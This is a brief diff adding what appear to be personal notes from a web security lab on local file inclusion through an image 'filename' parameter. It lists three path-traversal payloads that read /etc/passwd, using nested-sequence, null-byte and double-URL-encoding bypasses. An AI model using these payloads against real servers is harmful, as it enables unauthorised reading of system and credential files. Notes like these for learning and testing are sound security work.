@@ -1,0 +1,5 @@
+1. there might be hidden requests loading images, that are vulnerable to LFI 
+2. valid payload:
+/image?filename=....//....//....//etc//passwd
+/image?filename=../../../../../../etc/passwd%00.jpg
+/image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
